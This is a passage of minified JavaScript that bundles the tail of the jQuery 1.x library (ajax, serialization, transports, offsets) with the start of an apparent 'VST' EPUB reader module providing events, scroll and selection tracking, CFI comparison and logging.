            if (T.promise(x).complete = S.add, x.success = x.done, x.error = x.fail, g.url = ((e || g.url || jt) + "").replace(Mt, "").replace(Gt, Lt[1] + "//"), g.type = t.method || t.type || g.method || g.type, g.dataTypes = ie.trim(g.dataType || "*").toLowerCase().match(Se) || [""], null == g.crossDomain && (o = zt.exec(g.url.toLowerCase()), g.crossDomain = !(!o || o[1] === Lt[1] && o[2] === Lt[2] && (o[3] || ("http:" === o[1] ? "80" : "443")) === (Lt[3] || ("http:" === Lt[1] ? "80" : "443")))), g.data && g.processData && "string" != typeof g.data && (g.data = ie.param(g.data, g.traditional)), O(Jt, g, t, x), 2 === b)
                return x;
            for (i in (h = ie.event && g.global) && 0 == ie.active++ && ie.event.trigger("ajaxStart"), g.type = g.type.toUpperCase(), g.hasContent = !Wt.test(g.type), u = g.url, g.hasContent || (g.data && (u = g.url += (Ht.test(u) ? "&" : "?") + g.data, delete g.data), !1 === g.cache && (g.url = Ot.test(u) ? u.replace(Ot, "$1_=" + Bt++) : u + (Ht.test(u) ? "&" : "?") + "_=" + Bt++)), g.ifModified && (ie.lastModified[u] && x.setRequestHeader("If-Modified-Since", ie.lastModified[u]), ie.etag[u] && x.setRequestHeader("If-None-Match", ie.etag[u])), (g.data && g.hasContent && !1 !== g.contentType || t.contentType) && x.setRequestHeader("Content-Type", g.contentType), x.setRequestHeader("Accept", g.dataTypes[0] && g.accepts[g.dataTypes[0]] ? g.accepts[g.dataTypes[0]] + ("*" !== g.dataTypes[0] ? ", " + $t + "; q=0.01" : "") : g.accepts["*"]), g.headers)
                x.setRequestHeader(i, g.headers[i]);
            if (g.beforeSend && (!1 === g.beforeSend.call(m, x, g) || 2 === b))
                return x.abort();
            for (i in l = "abort", {
                success: 1,
                error: 1,
                complete: 1
            })
                x[i](g[i]);
            if (p = O(qt, g, t, x)) {
                x.readyState = 1,
                h && v.trigger("ajaxSend", [x, g]),
                g.async && 0 < g.timeout && (f = setTimeout(function() {
                    x.abort("timeout")
                }, g.timeout));
                try {
                    b = 1,
                    p.send(a, n)
                } catch (w) {
                    if (!(b < 2))
                        throw w;
                    n(-1, w)
                }
            } else
                n(-1, "No Transport");
            return x
        },
        getJSON: function(e, t, n) {
            return ie.get(e, t, n, "json")
        },
        getScript: function(e, t) {
            return ie.get(e, void 0, t, "script")
        }
    }),
    ie.each(["get", "post"], function(e, i) {
        ie[i] = function(e, t, n, o) {
            return ie.isFunction(t) && (o = o || n, n = t, t = void 0), ie.ajax({
                url: e,
                type: i,
                dataType: o,
                data: t,
                success: n
            })
        }
    }),
    ie._evalUrl = function(e) {
        return ie.ajax({
            url: e,
            type: "GET",
            dataType: "script",
            async: !1,
            global: !1,
            "throws": !0
        })
    },
    ie.fn.extend({
        wrapAll: function(t) {
            if (ie.isFunction(t))
                return this.each(function(e) {
                    ie(this).wrapAll(t.call(this, e))
                });
            if (this[0]) {
                var e = ie(t, this[0].ownerDocument).eq(0).clone(!0);
                this[0].parentNode && e.insertBefore(this[0]),
                e.map(function() {
                    for (var e = this; e.firstChild && 1 === e.firstChild.nodeType;)
                        e = e.firstChild;
                    return e
                }).append(this)
            }
            return this
        },
        wrapInner: function(n) {
            return this.each(ie.isFunction(n) ? function(e) {
                ie(this).wrapInner(n.call(this, e))
            } : function() {
                var e = ie(this),
                    t = e.contents();
                t.length ? t.wrapAll(n) : e.append(n)
            })
        },
        wrap: function(t) {
            var n = ie.isFunction(t);
            return this.each(function(e) {
                ie(this).wrapAll(n ? t.call(this, e) : t)
            })
        },
        unwrap: function() {
            return this.parent().each(function() {
                ie.nodeName(this, "body") || ie(this).replaceWith(this.childNodes)
            }).end()
        }
    }),
    ie.expr.filters.hidden = function(e) {
        return e.offsetWidth <= 0 && e.offsetHeight <= 0 || !ne.reliableHiddenOffsets() && "none" === (e.style && e.style.display || ie.css(e, "display"))
    },
    ie.expr.filters.visible = function(e) {
        return !ie.expr.filters.hidden(e)
    };
    var Xt = /%20/g,
        Yt = /\[\]$/,
        Kt = /\r?\n/g,
        Qt = /^(?:submit|button|image|reset|file)$/i,
        Zt = /^(?:input|select|textarea|keygen)/i;
    ie.param = function(e, t) {
        var n,
            o = [],
            i = function(e, t) {
                t = ie.isFunction(t) ? t() : null == t ? "" : t,
                o[o.length] = encodeURIComponent(e) + "=" + encodeURIComponent(t)
            };
        if (void 0 === t && (t = ie.ajaxSettings && ie.ajaxSettings.traditional), ie.isArray(e) || e.jquery && !ie.isPlainObject(e))
            ie.each(e, function() {
                i(this.name, this.value)
            });
        else
            for (n in e)
                G(n, e[n], t, i);
        return o.join("&").replace(Xt, "+")
    },
    ie.fn.extend({
        serialize: function() {
            return ie.param(this.serializeArray())
        },
        serializeArray: function() {
            return this.map(function() {
                var e = ie.prop(this, "elements");
                return e ? ie.makeArray(e) : this
            }).filter(function() {
                var e = this.type;
                return this.name && !ie(this).is(":disabled") && Zt.test(this.nodeName) && !Qt.test(e) && (this.checked || !Ne.test(e))
            }).map(function(e, t) {
                var n = ie(this).val();
                return null == n ? null : ie.isArray(n) ? ie.map(n, function(e) {
                    return {
                        name: t.name,
                        value: e.replace(Kt, "\r\n")
                    }
                }) : {
                    name: t.name,
                    value: n.replace(Kt, "\r\n")
                }
            }).get()
        }
    }),
    ie.ajaxSettings.xhr = void 0 !== p.ActiveXObject ? function() {
        return !this.isLocal && /^(get|post|head|put|delete|options)$/i.test(this.type) && z() || J()
    } : z;
    var en = 0,
        tn = {},
        nn = ie.ajaxSettings.xhr();
    p.attachEvent && p.attachEvent("onunload", function() {
        for (var e in tn)
            tn[e](void 0, !0)
    }),
    ne.cors = !!nn && "withCredentials" in nn,
    (nn = ne.ajax = !!nn) && ie.ajaxTransport(function(l) {
        var c;
        if (!l.crossDomain || ne.cors)
            return {
                send: function(e, r) {
                    var t,
                        a = l.xhr(),
                        s = ++en;
                    if (a.open(l.type, l.url, l.async, l.username, l.password), l.xhrFields)
                        for (t in l.xhrFields)
                            a[t] = l.xhrFields[t];
                    for (t in l.mimeType && a.overrideMimeType && a.overrideMimeType(l.mimeType), l.crossDomain || e["X-Requested-With"] || (e["X-Requested-With"] = "XMLHttpRequest"), e)
                        void 0 !== e[t] && a.setRequestHeader(t, e[t] + "");
                    a.send(l.hasContent && l.data || null),
                    c = function(e, t) {
                        var n,
                            o,
                            i;
                        if (c && (t || 4 === a.readyState))
                            if (delete tn[s], c = void 0, a.onreadystatechange = ie.noop, t)
                                4 !== a.readyState && a.abort();
                            else {
                                i = {},
                                n = a.status,
                                "string" == typeof a.responseText && (i.text = a.responseText);
                                try {
                                    o = a.statusText
                                } catch (d) {
                                    o = ""
                                }
                                n || !l.isLocal || l.crossDomain ? 1223 === n && (n = 204) : n = i.text ? 200 : 404
                            }
                        i && r(n, o, i, a.getAllResponseHeaders())
                    },
                    l.async ? 4 === a.readyState ? setTimeout(c) : a.onreadystatechange = tn[s] = c : c()
                },
                abort: function() {
                    c && c(void 0, !0)
                }
            }
    }),
    ie.ajaxSetup({
        accepts: {
            script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
        },
        contents: {
            script: /(?:java|ecma)script/
        },
        converters: {
            "text script": function(e) {
                return ie.globalEval(e), e
            }
        }
    }),
    ie.ajaxPrefilter("script", function(e) {
        void 0 === e.cache && (e.cache = !1),
        e.crossDomain && (e.type = "GET", e.global = !1)
    }),
    ie.ajaxTransport("script", function(t) {
        if (t.crossDomain) {
            var o,
                i = pe.head || ie("head")[0] || pe.documentElement;
            return {
                send: function(e, n) {
                    (o = pe.createElement("script")).async = !0,
                    t.scriptCharset && (o.charset = t.scriptCharset),
                    o.src = t.url,
                    o.onload = o.onreadystatechange = function(e, t) {
                        (t || !o.readyState || /loaded|complete/.test(o.readyState)) && (o.onload = o.onreadystatechange = null, o.parentNode && o.parentNode.removeChild(o), o = null, t || n(200, "success"))
                    },
                    i.insertBefore(o, i.firstChild)
                },
                abort: function() {
                    o && o.onload(void 0, !0)
                }
            }
        }
    });
    var on = [],
        rn = /(=)\?(?=&|$)|\?\?/;
    ie.ajaxSetup({
        jsonp: "callback",
        jsonpCallback: function() {
            var e = on.pop() || ie.expando + "_" + Bt++;
            return this[e] = !0, e
        }
    }),
    ie.ajaxPrefilter("json jsonp", function(e, t, n) {
        var o,
            i,
            r,
            a = !1 !== e.jsonp && (rn.test(e.url) ? "url" : "string" == typeof e.data && !(e.contentType || "").indexOf("application/x-www-form-urlencoded") && rn.test(e.data) && "data");
        return a || "jsonp" === e.dataTypes[0] ? (o = e.jsonpCallback = ie.isFunction(e.jsonpCallback) ? e.jsonpCallback() : e.jsonpCallback, a ? e[a] = e[a].replace(rn, "$1" + o) : !1 !== e.jsonp && (e.url += (Ht.test(e.url) ? "&" : "?") + e.jsonp + "=" + o), e.converters["script json"] = function() {
            return r || ie.error(o + " was not called"), r[0]
        }, e.dataTypes[0] = "json", i = p[o], p[o] = function() {
            r = arguments
        }, n.always(function() {
            p[o] = i,
            e[o] && (e.jsonpCallback = t.jsonpCallback, on.push(o)),
            r && ie.isFunction(i) && i(r[0]),
            r = i = void 0
        }), "script") : void 0
    }),
    ie.parseHTML = function(e, t, n) {
        if (!e || "string" != typeof e)
            return null;
        "boolean" == typeof t && (n = t, t = !1),
        t = t || pe;
        var o = de.exec(e),
            i = !n && [];
        return o ? [t.createElement(o[1])] : (o = ie.buildFragment([e], t, i), i && i.length && ie(i).remove(), ie.merge([], o.childNodes))
    };
    var an = ie.fn.load;
    ie.fn.load = function(e, t, n) {
        if ("string" != typeof e && an)
            return an.apply(this, arguments);
        var o,
            i,
            r,
            a = this,
            s = e.indexOf(" ");
        return 0 <= s && (o = ie.trim(e.slice(s, e.length)), e = e.slice(0, s)), ie.isFunction(t) ? (n = t, t = void 0) : t && "object" == typeof t && (r = "POST"), 0 < a.length && ie.ajax({
            url: e,
            type: r,
            dataType: "html",
            data: t
        }).done(function(e) {
            i = arguments,
            a.html(o ? ie("<div>").append(ie.parseHTML(e)).find(o) : e)
        }).complete(n && function(e, t) {
            a.each(n, i || [e.responseText, t, e])
        }), this
    },
    ie.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function(e, t) {
        ie.fn[t] = function(e) {
            return this.on(t, e)
        }
    }),
    ie.expr.filters.animated = function(t) {
        return ie.grep(ie.timers, function(e) {
            return t === e.elem
        }).length
    };
    var sn = p.document.documentElement;
    ie.offset = {
        setOffset: function(e, t, n) {
            var o,
                i,
                r,
                a,
                s,
                l,
                c = ie.css(e, "position"),
                u = ie(e),
                d = {};
            "static" === c && (e.style.position = "relative"),
            s = u.offset(),
            r = ie.css(e, "top"),
            l = ie.css(e, "left"),
            ("absolute" === c || "fixed" === c) && -1 < ie.inArray("auto", [r, l]) ? (a = (o = u.position()).top, i = o.left) : (a = parseFloat(r) || 0, i = parseFloat(l) || 0),
            ie.isFunction(t) && (t = t.call(e, n, s)),
            null != t.top && (d.top = t.top - s.top + a),
            null != t.left && (d.left = t.left - s.left + i),
            "using" in t ? t.using.call(e, d) : u.css(d)
        }
    },
    ie.fn.extend({
        offset: function(t) {
            if (arguments.length)
                return void 0 === t ? this : this.each(function(e) {
                    ie.offset.setOffset(this, t, e)
                });
            var e,
                n,
                o = {
                    top: 0,
                    left: 0
                },
                i = this[0],
                r = i && i.ownerDocument;
            return r ? (e = r.documentElement, ie.contains(e, i) ? (typeof i.getBoundingClientRect !== xe && (o = i.getBoundingClientRect()), n = q(r), {
                top: o.top + (n.pageYOffset || e.scrollTop) - (e.clientTop || 0),
                left: o.left + (n.pageXOffset || e.scrollLeft) - (e.clientLeft || 0)
            }) : o) : void 0
        },
        position: function() {
            if (this[0]) {
                var e,
                    t,
                    n = {
                        top: 0,
                        left: 0
                    },
                    o = this[0];
                return "fixed" === ie.css(o, "position") ? t = o.getBoundingClientRect() : (e = this.offsetParent(), t = this.offset(), ie.nodeName(e[0], "html") || (n = e.offset()), n.top += ie.css(e[0], "borderTopWidth", !0), n.left += ie.css(e[0], "borderLeftWidth", !0)), {
                    top: t.top - n.top - ie.css(o, "marginTop", !0),
                    left: t.left - n.left - ie.css(o, "marginLeft", !0)
                }
            }
        },
        offsetParent: function() {
            return this.map(function() {
                for (var e = this.offsetParent || sn; e && !ie.nodeName(e, "html") && "static" === ie.css(e, "position");)
                    e = e.offsetParent;
                return e || sn
            })
        }
    }),
    ie.each({
        scrollLeft: "pageXOffset",
        scrollTop: "pageYOffset"
    }, function(t, i) {
        var r = /Y/.test(i);
        ie.fn[t] = function(e) {
            return Ie(this, function(e, t, n) {
                var o = q(e);
                return void 0 === n ? o ? i in o ? o[i] : o.document.documentElement[t] : e[t] : void (o ? o.scrollTo(r ? ie(o).scrollLeft() : n, r ? n : ie(o).scrollTop()) : e[t] = n)
            }, t, e, arguments.length, null)
        }
    }),
    ie.each(["top", "left"], function(e, n) {
        ie.cssHooks[n] = k(ne.pixelPosition, function(e, t) {
            return t ? (t = et(e, n), nt.test(t) ? ie(e).position()[n] + "px" : t) : void 0
        })
    }),
    ie.each({
        Height: "height",
        Width: "width"
    }, function(r, a) {
        ie.each({
            padding: "inner" + r,
            content: a,
            "": "outer" + r
        }, function(o, e) {
            ie.fn[e] = function(e, t) {
                var n = arguments.length && (o || "boolean" != typeof e),
                    i = o || (!0 === e || !0 === t ? "margin" : "border");
                return Ie(this, function(e, t, n) {
                    var o;
                    return ie.isWindow(e) ? e.document.documentElement["client" + r] : 9 === e.nodeType ? (o = e.documentElement, Math.max(e.body["scroll" + r], o["scroll" + r], e.body["offset" + r], o["offset" + r], o["client" + r])) : void 0 === n ? ie.css(e, t, i) : ie.style(e, t, n, i)
                }, a, n ? e : void 0, n, null)
            }
        })
    }),
    ie.fn.size = function() {
        return this.length
    },
    ie.fn.andSelf = ie.fn.addBack,
    "function" == typeof define && define.amd && define("jquery", [], function() {
        return ie
    });
    var ln = p.jQuery,
        cn = p.$;
    return ie.noConflict = function(e) {
        return p.$ === ie && (p.$ = cn), e && p.jQuery === ie && (p.jQuery = ln), ie
    }, typeof t === xe && (p.jQuery = p.$ = ie), ie
}),
function(e) {
    var t = e;
    (function(i) {
        var r = {
            Models: {},
            Settings: {
                enableLogging: !1,
                wordsPerPage: 300
            },
            enableLogging: function() {
                this.Settings.enableLogging = !0
            },
            disableLogging: function() {
                this.Settings.enableLogging = !1
            },
            setLogLevel: function(e) {
                void 0 === (e = r.Logger.levels[e]) && (e = r.Logger.levels.error),
                this.Settings.logLevel = e
            },
            resetArrays: function() {
                this.windows = [],
                this.documents = []
            },
            init: function(t, n, e, o) {
                null == t && (t = window),
                null == n && (n = document),
                null == e && (e = VSTEPUBModule),
                this.window = t,
                this.document = n,
                this.documents && this.windows && r.Book && r.Book.isEpub() ? (this.windows = this.windows.find(function(e) {
                    return e === t
                }) ? this.windows : this.windows.concat([t]), this.documents = this.documents.find(function(e) {
                    return e === n
                }) ? this.documents : this.documents.concat([n])) : (this.windows = [t], this.documents = [n]),
                this.scrollElement = 1 < this.documents.length ? document.getElementById("epub-container") : o || t,
                this.sharedEpubModule = e,
                i(this.window).load(function() {
                    r.fire("internal:page:load")
                }),
                i(this.window).unload(function() {
                    r.fire("page:unload")
                }),
                r.Models.Highlight.init(this.window, this.document),
                r.Utils.init(this.window, this.document, this.scrollElement)
            },
            eW: function(t, n) {
                var o = !1;
                this.fire = function() {
                    o || r.EventDispatcher.fire(t)
                };
                var i = this;
                return setTimeout(function() {
                    r.fire(t + ":before");
                    var e = n.call(i);
                    return o || r.fire(t), e
                }, 0)
            },
            ajax: function(e, o) {
                return r.Utils.calculateAjaxKey(e), o && (e.error = e.error || function(e, t) {
                    var n = new r.Error(t);
                    o(n)
                }), i.ajax(e)
            },
            Error: function(e) {
                this.message = e
            }
        };
        this.VST = r
    }).call(window, t),
    function(i) {
        VST.EventDispatcher = new function() {
            var c = {},
                u = {},
                o = {},
                a = {},
                r = {},
                i = this,
                s = function(e) {
                    return !!(c[e] && 0 < c[e].length)
                },
                l = function(e) {
                    if (s(e)) {
                        for (var t = [], n = c[e].length - 1; 0 <= n; n--)
                            c[e][n].unbound && t.push(n);
                        for (var o = 0; o < t.length; o++)
                            c[e].splice(t[o], 1)
                    }
                },
                d = function(e) {
                    return !!(u[e] && 0 < u[e].length)
                };
            this.init = function() {
                return r = {}, this
            },
            this.getBatchedEvents = function() {
                return o
            },
            this.getListeners = function(e) {
                return c[e] || []
            },
            this.firedEvents = function() {
                return r
            },
            this.unbind = function(e, t) {
                if (t) {
                    if (c[e])
                        for (var n = c[e].length - 1; 0 <= n; n--) {
                            var o = c[e][n];
                            if (o.handler == t)
                                return VST.Logger.debug("we found the handler"), void (c[e][n].unbound = !0);
                            VST.Logger.debug("no handler", o, t)
                        }
                } else
                    c[e] && (c[e] = null)
            },
            this.bind = function(e, t, n, o) {
                if (t = {
                    handler: t,
                    binding: n = n || this
                }, o) {
                    u[e] = u[e] || [];
                    for (var i = u[e].length - 1; 0 <= i; i--) {
                        if ((r = u[e][i]).handler === t.handler && r.binding === t.binding)
                            return VST.Logger.debug("handler already bound"), !1
                    }
                    u[e].push(t)
                } else {
                    c[e] = c[e] || [];
                    for (i = c[e].length - 1; 0 <= i; i--) {
                        var r;
                        if ((r = c[e][i]).handler === t.handler && r.binding === t.binding)
                            return VST.Logger.debug("handler already bound"), !1
                    }
                    c[e].push(t)
                }
                return this
            },
            this.once = function(e, t, n, o) {
                n = n || this;
                for (var i = (o ? u : c)[e] || [], r = i.length - 1; 0 <= r; r--) {
                    var a = i[r].handler;
                    if (a.handler === t && a === n)
                        return this
                }
                var s = function() {
                        return l(), t.apply(n, arguments)
                    },
                    l = function() {
                        VST.Logger.debug("cancelling ourself!"),
                        VST.unbind(e, s)
                    };
                return this.bind(e, s, n, o)
            },
            this.cancel = function(e) {
                o[e] && clearTimeout(o[e].timer)
            },
            this.fireLater = function(e, t, n) {
                return null == n && (n = 20), o[e] ? clearTimeout(o[e].timer) : o[e] = {}, o[e].timer = setTimeout(function() {
                    i.fire(e, t)
                }, n), this
            },
            this.fire = function(e, t) {
                var n;
                if (n = e instanceof VST.Event ? e : new VST.Event(e), t ? VST.Logger.debug(n.toString(), t) : VST.Logger.debug(n.toString()), r[n.name] = t, d(n.name))
                    for (var o = 0; o < u[n.name].length; o++) {
                        (i = u[n.name][o]).handler.call(i.binding, n, t)
                    }
                if (s(n.name)) {
                    for (o = 0; o < c[n.name].length; o++)
                        if (n.shouldPropogate()) {
                            var i;
                            (i = c[n.name][o]).unbound || i.handler.call(i.binding, n, t)
                        }
                    l(n.name)
                }
                return this
            },
            this.throttle = function(e, t, n, o) {
                n = n || 20,
                o = o || 100,
                a[e] = a[e] || {
                    count: 0
                };
                var i = a[e];
                clearTimeout(i.timer);
                var r = function() {
                    a[e].lastFired = +new Date,
                    a[e].count = 0,
                    VST.fire(e, t)
                };
                return function() {
                    return i.count + 1 >= n || (!i.lastFired || +new Date - i.lastFired > o)
                }() ? r() : (a[e].count += 1, a[e].timer = setTimeout(r, o)), this
            },
            this.trigger = this.fire,
            this.fireBefore = function(e, t) {
                return this.fire(e + ":before", t), this
            }
        },
        VST.delayedEventWrapper = function(t, n, o, e) {
            "function" != typeof o && (e = o, o = n, n = this);
            var i = function() {
                VST.EventDispatcher.fireLater(t + ":before");
                var e = o.call(n);
                return VST.EventDispatcher.fireLater(t), e
            };
            return e ? i() : void setTimeout(i, 0)
        },
        VST.eventWrapper = function(t, n, o, e) {
            "function" != typeof o && (e = o, o = n, n = this);
            var i = function() {
                VST.EventDispatcher.fire(t + ":before");
                var e = o.call(n);
                return VST.EventDispatcher.fire(t), e
            };
            return e ? i() : void setTimeout(i, 0)
        },
        VST.ajaxEventWrapper = function(e, t, n) {
            VST.EventDispatcher.fire(e + ":before");
            var o = t.complete;
            t.complete = function() {
                VST.EventDispatcher.fire(e),
                o && o.apply(this, arguments)
            },
            n && (t.error = t.error || function(e, t) {
                t = new VST.Error(status);
                n(t, void 0)
            }),
            i.ajax(t)
        },
        VST.delayedAjaxEventWrapper = function(e, t, n) {
            VST.EventDispatcher.fireLater(e + ":before"),
            t.complete = function() {
                VST.EventDispatcher.fireLater(e)
            },
            n && (t.error = t.error || function(e, t) {
                t = new VST.Error(status);
                n(t, void 0)
            }),
            i.ajax(t)
        },
        VST.bind = VST.EventDispatcher.bind,
        VST.unbind = VST.EventDispatcher.unbind,
        VST.once = VST.EventDispatcher.once,
        VST.fire = VST.EventDispatcher.fire,
        VST.fireLater = VST.EventDispatcher.fireLater,
        VST.throttle = VST.EventDispatcher.throttle,
        VST.trigger = VST.fire,
        VST.Event = function(e, t) {
            VST.Utils.setDefaults(this, t),
            this.name = e;
            var n = !0;
            this.stop = function() {
                n = !1
            },
            this.shouldPropogate = function() {
                return n
            },
            this.fire = function() {
                VST.EventDispatcher.fire(this)
            },
            this.toString = function() {
                return "[Event] : " + this.name
            }
        },
        VST.Event.fromjQueryEvent = function(e, t, n) {
            return n = n || {}, VST.Utils.setDefaults(n, {
                target: t.target,
                originalEvent: t
            }), new VST.Event(e, n)
        }
    }.call(window, t),
    function(i) {
        VST.Utils = {},
        VST.Utils.init = function() {
            VST.Utils.watchCopy(),
            VST.Utils.watchScroll()
        },
        VST.Utils.watchCopy = function() {
            i(VST.document).find("body").bind("copy", function(e) {
                "undefined" != typeof VST.Book && VST.Book.handleCopy(e)
            })
        },
        VST.Utils.pageScrollHandler = function() {
            VST.fireLater("internal:page:scroll"),
            VST.fire("page:scroll:raw")
        },
        VST.Utils.throttledPageScrollHandler = function() {
            VST.fire("page:scroll:raw"),
            VST.throttle("internal:page:scroll", +new Date, 20)
        },
        VST.Utils.scrollTop = function() {
            var e = VST.scrollElement.scrollTop || VST.scrollElement.scrollY || VST.scrollElement.pageYOffset;
            return void 0 === e && (e = 0), e
        },
        VST.Utils.scrollLeft = function() {
            var e = VST.scrollElement.scrollLeft || VST.scrollElement.scrollX || VST.scrollElement.pageXOffset;
            return void 0 === e && (e = 0), e
        };
        var t = function() {
            var e = VST.$(VST.document),
                t = function(e) {
                    return -1 != ["style", "script"].indexOf(e.nodeName.toLowerCase())
                },
                n = {
                    cfi: VST.sharedEpubModule.GetCFIForCurrentScrollPosition(t),
                    scrollTop: VST.Utils.scrollTop(),
                    scrollLeft: VST.Utils.scrollLeft(),
                    scrollHeight: VST.scrollElement.scrollHeight || e.outerHeight(),
                    scrollWidth: VST.scrollElement.scrollWidth || e.outerWidth()
                };
            VST.fire("page:scroll", n)
        };
        VST.Utils.watchScroll = function() {
            i(VST.scrollElement).unbind("scroll.vst"),
            i(VST.scrollElement).bind("scroll.vst", VST.Utils.pageScrollHandler),
            VST.bind("internal:page:scroll", t, null, !0)
        },
        VST.Utils.triggerPageScroll = function() {
            t()
        },
        VST.Utils.throttlePageScrollEvent = function() {
            i(VST.scrollElement).unbind("scroll.vst"),
            i(VST.scrollElement).bind("scroll.vst", VST.Utils.throttledPageScrollHandler),
            VST.bind("internal:page:scroll", t, null, !0)
        };
        var e = !(VST.Utils.fireScrollOnlyOnStop = function() {
            var e;
            i(VST.scrollElement).unbind("scroll.vst"),
            i(VST.scrollElement).bind("scroll.vst", function() {
                clearTimeout(e),
                e = setTimeout(t, 100)
            })
        });
        VST.Utils.pauseSelectionEventTriggering = function() {
            e = !0
        },
        VST.Utils.resumeSelectionEventTriggering = function() {
            e = !1
        },
        VST.Utils.selectionEventTriggeringIsPaused = function() {
            return e
        },
        VST.Utils.getSelectionObject = function() {
            return delete VST.selectionObject, VST.windows ? VST.windows.forEach(function(e) {
                e.getSelection && e.getSelection() && e.getSelection().anchorNode && (VST.selectionObject = e.getSelection())
            }) : VST.documents && VST.documents.forEach(function(e) {
                VST.selectionObject = VST.selectionObject || e.selection && e.selection.createRange()
            }), VST.selectionObject
        },
        VST.Utils.getRangeObject = function(e) {
            if (null == e && (e = VST.Utils.getSelectionObject()), !e)
                return null;
            if (e.getRangeAt)
                return 0 < e.rangeCount ? e.getRangeAt(0) : null;
            var t = VST.document.selection.createRange();
            return t ? (t.setStart(e.anchorNode, e.anchorOffset), t.setEnd(e.focusNode, e.focusOffset), t) : null
        },
        VST.Utils.defaultGetSelectedTextHandler = function() {
            var e = VST.Utils.getSelectionObject(),
                t = (VST.document, VST.window, e);
            return e ? (e.toString && (t = e.toString()), "undefined" != typeof e.text && (t = e.text), t) : ""
        },
        VST.Utils.getSelectedText = function() {
            return VST.Handler.get("VST.Utils.getSelectedText", VST.Utils.defaultGetSelectedTextHandler)()
        },
        VST.Utils.calculateAjaxKey = function(e) {
            var t = e.url;
            return e.dataType && (t += ":" + e.dataType), e.data && (t += i.param(e.data)), t
        },
        VST.Utils.setDefaults = function(e, t) {
            if (void 0 !== t)
                for (var n in t)
                    t.hasOwnProperty(n) && (e[n] = t[n])
        },
        VST.Utils.getElementText = function(e) {
            var t = "";
            if (!e)
                return "";
            e.length && (e = e.constructor === String ? i(VST.document).find(e)[0] : e[0]);
            for (var n = 0; n < e.childNodes.length; n++) {
                var o = e.childNodes[n];
                3 === o.nodeType ? t += o.nodeValue : 1 === o.nodeType && ("img" === o.nodeName.toLowerCase() && (t += o.alt || o.title), o.contentDocument ? t += VST.Utils.getElementText(o.contentDocument.body) : /script|style|object/i.test(o.nodeName) || (t += VST.Utils.getElementText(o)))
            }
            return t
        },
        VST.Utils.LESS_THAN = -1,
        VST.Utils.EQUAL = 0,
        VST.Utils.GREATER_THAN = 1,
        VST.Utils.stripCFIAssertions = function(e) {
            return e.replace(/\[(.*?)[^\^]\]/g, "")
        },
        VST.Utils.compareCFIs = function(e, t) {
            if (null == e && (e = ""), null == t && (t = ""), e = VST.Utils.stripCFIAssertions(e), t = VST.Utils.stripCFIAssertions(t), (e = e.replace(/!$/, "")) === (t = t.replace(/!$/, "")))
                return VST.Utils.EQUAL;
            for (var n = /[\/@~:!]/, o = /(\[.+\]|[^\d])/g, i = e.split(n), r = t.split(n), a = 0;; a++) {
                var s = i[a],
                    l = r[a];
                if (null == s && null == l)
                    return VST.Utils.EQUAL;
                if (null == s)
                    return VST.Utils.LESS_THAN;
                if (null == l)
                    return VST.Utils.GREATER_THAN;
                if (s !== l) {
                    if ((s = parseFloat(s.replace(o, ""), 10)) < (l = parseFloat(l.replace(o, ""), 10)))
                        return VST.Utils.LESS_THAN;
                    if (l < s)
                        return VST.Utils.GREATER_THAN
                }
            }
        },
        VST.Utils.installCallback = function(e) {
            VST.Utils.callbackMap ? ++VST.Utils.callbackID : (VST.Utils.callbackMap = {}, VST.Utils.callbackID = 1);
            var t = VST.Utils.callbackID;
            return VST.Utils.callbackMap[t] = e, t
        },
        VST.Utils.findCallback = function(e) {
            return VST.Utils.callbackMap ? VST.Utils.callbackMap[e] : void 0
        },
        VST.Utils.removeCallback = function(e) {
            VST.Utils.callbackMap && delete VST.Utils.callbackMap[e]
        },
        VST.Utils.fireCallback = function(e) {
            var t = VST.Utils.findCallback(e);
            if (t) {
                var n,
                    o = [],
                    i = arguments.length;
                for (n = 1; n < i; ++n)
                    o.push(arguments[n]);
                t.apply(this, o),
                VST.Utils.removeCallback(e)
            } else
                VST.Logger.error("Callback id not found: " + e)
        },
        VST.Utils.isArray = function(e) {
            return "[object Array]" === Object.prototype.toString.call(e)
        },
        VST.Utils.getQueryParam = function(e, t) {
            for (var n = e.location.search.substring(1).split("&"), o = 0; o < n.length; o++) {
                var i = n[o].split("=");
                if (i[0] == t)
                    return i[1]
            }
        };
        var r = {};
        window.ifr = r,
        VST.Utils.multi = function(e, t, n, o) {
            o = o || this;
            var i = e + ":multi";
            r[e] ? VST.once(i, function(e, t) {
                n.apply(n, t)
            }) : (r[e] = !0, t.call(o, function() {
                delete r[e],
                n.apply(o, arguments),
                VST.trigger(i, arguments)
            }))
        },
        VST.Utility = VST.Utils
    }.call(window, t),
    function() {
        this.VST.noop = function() {},
        this.VST.Handler = {
            _handlers: []
        },
        this.VST.Handler.get = function(e, t) {
            return t = t || VST.noop, this._handlers[e] || t
        },
        this.VST.Handler.set = function(e, t) {
            this._handlers[e] = t
        },
        this.VST.Handler.fire = function(e, t, n) {
            return n = n || this, VST.Utils.isArray(t) ? VST.Handler.get(e).apply(n, t) : VST.Handler.get(e).call(n, t || VST.noop)
        }
    }.call(window),
    function() {
        VST.Logger = {
            levels: {
                debug: 0,
                info: 1,
                warn: 2,
                warning: 2,
                error: 3,
                ignore: 4
            }
        };
        var e = [];
        for (var n in VST.Logger.levels)
            !function(t) {
                "ignore" !== t && (e.push(t), VST.Logger[t] = function() {
                    var e = Array.prototype.slice.call(arguments);
                    e.push(t),
                    VST.log.apply(VST.log, e)
                })
            }(n);
        var o = new RegExp("^" + e.join("|") + "$");
        VST.log = function() {
            var e = Array.prototype.slice.call(arguments),
                t = "info";
            if (1 < e.length && o.test(e[e.length - 1]) && (t = e.pop()), VST.Logger.levels[t] >= VST.Settings.logLevel && console && console.log && console.log.apply)
                try {
                    return console.log.apply(console, e)
                } catch (n) {}
        },
        VST.setLogLevel("error")
    }.call(window, t),
    function() {
        VST.Reader = function(e, t) {
            this.name = e,
            this.version = t || "1.0",
            this.layoutStyle = "scrolling"
        },
        VST.Reader.prototype.hasFeature = function(e) {
            switch (e) {
            case "mouse-events":
            case "keyboard-events":
            case "spine-scripting":
            case "touch-events":
            case "layout-changes":
                return !0;
            default:
                return !1
            }
        },
        VST.Reader.prototype.isOnline = function() {
            return /online/i.test(this.name)
        },
        VST.Reader.prototype.isDesktop = function() {
            return /desktop/i.test(this.name)
        }
    }.call(window),
    function(d) {
        var n = function(e, t) {
            this.mediaType = e,
            this.href = t
        };
        n.prototype.render = function(e, t) {
            return t ? this.replaceObjectTag(t, e) : new o([this]).render(e)
        },
